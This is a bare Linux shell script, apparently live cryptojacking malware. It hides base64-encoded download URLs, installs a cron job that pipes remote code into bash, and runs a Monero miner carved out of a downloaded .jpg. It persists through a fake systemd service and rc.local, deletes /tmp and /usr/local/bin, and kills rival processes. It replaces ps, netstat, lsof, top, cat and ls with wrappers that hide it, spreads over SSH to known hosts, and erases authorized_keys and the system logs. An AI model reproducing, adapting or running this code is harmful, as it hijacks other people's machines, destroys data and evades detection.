#!/sbin/init

program_exists() {
    local ret='0'
    command -v $1 >/dev/null 2>&1 || { local ret='1'; }

    # fail on non-zero return value
    if [ "$ret" -ne 0 ]; then
        return 1
    fi

    return 0
}
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
stage_url=$(base64 -d <<< "aHR0cHM6Ly9pZGVvbmUuY29tL3BsYWluL2JIb0wyVwo=")
he_url=$(base64 -d <<< "aHR0cHM6Ly9pLmliYi5jby82UGRaME5UL2hlLmpwZwo=")
he_32_url=$(base64 -d <<< "aHR0cHM6Ly9pLmliYi5jby9waHdtbkNiL2hlMzIuanBnCg==")
he_save_jpg='/tmp/he.jpg'
he_save='/tmp/rcupd'
NAME=$(whoami)
chattr -ai /var/spool/cron/crontabs/${NAME}
crontab -r
(echo "*/10 * * * * (curl -fsSL ${stage_url}||wget -q -O- ${stage_url})|bash")|crontab -
chattr +ai /var/spool/cron/crontabs/${NAME}
flag=$(/bin/cat /etc/rc.local|grep bHoL2W|grep -v grep|wc -l)
if [[ ${NAME} == 'root' && ! -e '/usr/lib/systemd/system/snapid.service' ]] && program_exists systemctl; then
cat<<EOF>/usr/lib/systemd/system/snapid.service
[Unit]
Description=snap pid located server
After=network.target

[Service]
Type=simple
ExecStart=/tmp/rcupd --coin monero -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
Restart=always
RestartSec=20
RestartPreventExitStatus=23

[Install]
WantedBy=multi-user.target
EOF
systemctl enable snapid.service
elif [[ ${NAME} == 'root' ]]; then
    if [[ ! -e '/etc/rc.local' ]]; then
        touch /etc/rc.local
    fi
    if [[ ${flag} == 0 && "$NAME" == 'root' ]]; then 
        sed -i 's/exit 0//g' /etc/rc.local&&echo "echo \"*/10 * * * * (curl -fsSL ${stage_url}||wget -q -O- ${stage_url})|sh" >> /etc/rc.local
    fi
fi
process=$(/bin/ps auxf|grep -v grep|grep ${he_save}|wc -l)
if [ ${process} != 0 ]; then
    echo "run Successfully!!!"
    exit 0
fi
rm -rf /usr/local/bin/*
rm -rf /tmp/*
ps auxf | grep -v grep | grep "hwlh3wlh44lh" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "Circle_MI" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "get.bi-chi.com" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "hashvault.pro" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "nanopool.org" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "/usr/bin/.sshd" | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep "/usr/bin/bsd-port" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "watchbog" | awk '{print $2}'|xargs kill -9
p=$(/bin/ps auxf|grep -v grep|grep rcupd|wc -l)
if [ ${p} -eq 0 ]; then
    ps auxf|grep -v grep|awk '{if($3>=80.0) print $2}'|xargs kill -9
fi
if [ -e "/tmp/gates.lod" ]; then
    rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    kill -9 $(cat /tmp/gates.lod)
    rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    kill -9 $(cat /tmp/moni.lod)
    rm -rf /tmp/{gates,moni}.lod
fi
if [ ${NAME} = "root" ]; then
etc_exist=$(cat /etc/rc.local|grep '/usr/local/sbin'|wc -l)
if [[ ${etc_exist} == 0 ]]; then
    echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH' >> /etc/profile
    source /etc/profile
fi
touch /usr/local/bin/ps
cat<<EOF>>/usr/local/bin/ps
#!/sbin/init
/bin/ps \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
EOF
chmod +x /usr/local/bin/ps
touch /usr/local/bin/netstat
cat<<EOF>>/usr/local/bin/netstat
#!/sbin/init
/bin/netstat \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
EOF
chmod +x /usr/local/bin/netstat
touch /usr/local/bin/lsof
cat<<EOF>>/usr/local/bin/lsof
#!/sbin/init
/usr/bin/lsof \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
EOF
chmod +x /usr/local/bin/lsof
touch /usr/local/bin/top
cat <<EOF >> /usr/local/bin/top
#!/sbin/init
/usr/bin/top \$@ | grep -Ev 'rcupd'
EOF
chmod +x /usr/local/bin/top
touch /usr/local/bin/cat
cat<<EOF>>/usr/local/bin/cat
#!/sbin/init
/bin/cat \$@ | grep -Ev 'bHoL2W'
EOF
chmod +x /usr/local/bin/cat
touch /usr/local/bin/ls
cat<<EOF>>/usr/local/bin/ls
#!/sbin/init
/bin/ls \$@ | grep -Ev 'rcupd'
EOF
chmod +x /usr/local/bin/ls
fi

if [ ! -x "${he_save}" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL ${he_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
    else
        (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
    fi
    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
fi

if [ -e "${he_save_jpg}" ]; then
    rm -rf ${he_save_jpg}
fi

process=$(/bin/ps auxf|grep -v grep|grep ${he_save}|wc -l)
if [ ${process} == 0 ]; then 
    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
fi

if [ -x "${he_save}" ]; then
    chattr +ai ${he_save}
fi

if [[ ${NAME} == 'root' && -e '/usr/lib/systemd/system/snapid.service' ]]
    systemctl enable snapid.service
fi

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL ${stage_url}||wget -q -O- ${stage_url})|sh >/dev/null 2>&1 &' & done
fi
if [ ${NAME} = "root" ]; then
echo 0>/root/.ssh/authorized_keys
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
rm -rf /etc/cron.hourly/oanacron
rm -rf /etc/cron.daily/oanacron
rm -rf /etc/cron.monthly/oanacron
rm -rf /usr/local/bin/dns
fi
